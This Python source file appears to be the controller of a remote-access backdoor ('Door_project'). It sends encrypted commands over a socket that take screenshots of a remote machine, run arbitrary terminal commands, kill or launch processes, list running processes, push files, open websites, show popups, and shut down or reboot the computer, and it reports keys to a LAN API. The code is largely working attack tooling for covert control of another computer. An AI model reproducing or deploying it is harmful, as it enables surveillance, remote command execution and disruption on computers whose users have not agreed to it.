from time import sleep
import socket as ss
from PIL import Image
from pyautogui import alert
import io
from Crypto import cripto as jeff
import requests

# ---------------------------------------------------- #
             # Create Popup Command
# ---------------------------------------------------- #


def popup(objj, menssagem, ip_client):
    try:
        send, passw = jeff.criptografar(f"showpopupinwindow\\{menssagem}")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(10000)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")

    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")

    except ss.error:
        sleep(1.5)
        alert("Conection erro")

    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
            # Print Screen Command
# ---------------------------------------------------- #

def printt(objj, nome, ip_client):
    try:
        send, passw = jeff.criptografar("printscreensendconfirmationsignal")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        with open('C:\\Users\\drrod\\Desktop\\all\\Creative in Python\\PyPy\\apps py\\Door_project\\Pictures\\' + nome + '.png', 'wb') as foto:
                try:
                    while True:
                        dab = objj.recv(100000)
                        if not dab:
                            if jeff.descripto(dab.decode("utf-8"), passw) == "Photo Error\n\n":
                                alert("Photo Error")
                                break
                            else:
                                alert(f"Imagem {nome} instalada!")
                                break
                        foto.write(dab)

                except Exception:
                    sleep(1.5)
                    alert("Photo Error")

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")

    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")

    except ss.error:
        sleep(1.5)
        alert("Conection erro")

    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
             # Shutdown Command
# ---------------------------------------------------- #

def desligar(objj, ip_client):
    try:
        send, passw = jeff.criptografar("shutdowncomputersystem")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")

    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")

    except ss.error:
        sleep(1.5)
        alert("Conection erro")

    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
             # Open Site Command
# ---------------------------------------------------- #

def sit(objj, abc, ip_client):
    try:
        send, passw = jeff.criptografar(f"siteentering\\{abc}")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")

    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")

    except ss.error:
        sleep(1.5)
        alert("Conection erro")

    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
            # ---> Watch Window Command <---
# ---------------------------------------------------- #

def __watch_window(objj, ip_client):
    try:
        send, passw = jeff.criptografar("windowkillblackandshutdown")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")

    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")

    except ss.error:
        sleep(1.5)
        alert("Conection erro")

    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
             # Kill Process Command
# ---------------------------------------------------- #

def kill_process(objj, processo, ip_client):
    try:
        send, passw = jeff.criptografar(f"killterminalpidprocess\\{processo}.exe")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")

    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")

    except ss.error:
        sleep(1.5)
        alert("Conection erro")

    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
            # ---> Open App Command <---
# ---------------------------------------------------- #

def open_app(objj, processo, ip_client):
    try:
        send, passw = jeff.criptografar(f"oppenupapp\\{processo}.exe")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")
    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")
    except ss.error:
        sleep(1.5)
        alert("Conection erro")
    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
          #         Reboot Command
# ---------------------------------------------------- #

def reboot_command(objj, ip_client):
    try:
        send, passw = jeff.criptografar("restartsystemcomputer")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")

    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")

    except ss.error:
        sleep(1.5)
        alert("Conection erro")

    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
          # ---> Ligação command <---
# ---------------------------------------------------- #

def call_command(objj, ip_client):
    pass


# ---------------------------------------------------- #
#                 ---> Send Files <---
# ---------------------------------------------------- #


def send_file_(objj, photo, nome, ip_client):
    try:
        send, passw = jeff.criptografar(f"sendfilearquivemidiaorfile\\{nome}")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf-8"))
        foto = Image.open(photo)
        f = io.BytesIO()
        foto.save(f, 'PNG')
        objj.send(bytes(f.getvalue()))

    except FileNotFoundError:
        sleep(1.5)
        alert("File Not Found")
        objj.close()
    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")
        objj.close()
    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")
        objj.close()
    except ss.error:
        sleep(1.5)
        alert("Conection erro")
        objj.close()
    except Exception:
        sleep(1.5)
        alert("Conection erro")
        objj.close()


# ---------------------------------------------------- #
            # Catch Process Command
# ---------------------------------------------------- #

def process(objj, name, ip_client):
    try:
        send, passw = jeff.criptografar("chatchallprocesslistandsend")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                proc = dab.decode("utf-8").split(",")
                if proc != "Process list Error\n\n":
                    txt = open(f"processos_{name}", 'w+')
                    txt.write(f"Cliente {name} process\n")
                    txt.write(f"{'-=' * 30}\n\n")
                    for a in proc:
                        txt.write(a)
                    txt.close()
                    alert("Comando executado")
                else:
                    alert(proc)
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")
    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")
    except ss.error:
        sleep(1.5)
        alert("Conection erro")
    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
              # Execute Terminal Command
# ---------------------------------------------------- #


def expecifico(objj, comando, ip_client):
    try:
        send, passw = jeff.criptografar(f"expecifico\\{comando}")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")
    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")
    except ss.error:
        sleep(1.5)
        alert("Conection erro")
    except Exception:
        sleep(1.5)
        alert("Error")


# ---------------------------------------------------- #
                 # Change name Command
# ---------------------------------------------------- #

def change_name(objj, comando, ip_client):
    try:
        send, passw = jeff.criptografar(f"changeclientname\\{comando}")
        send_to_api(ip_client, passw)
        objj.send(bytes(send, "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                alert(jeff.descripto(dab.decode("utf-8"), passw))
                break

    except ConnectionRefusedError:
        sleep(1.5)
        alert("Conection erro")
    except ConnectionAbortedError:
        sleep(1.5)
        alert("Conection erro")
    except ss.error:
        sleep(1.5)
        alert("Conection erro")
    except Exception:
        sleep(1.5)
        alert("Error")


def send_to_api(ip, code):
    requests.get(f"http://192.168.0.53:8080/server/{ip}/{code}")


# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
                        # Script End
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
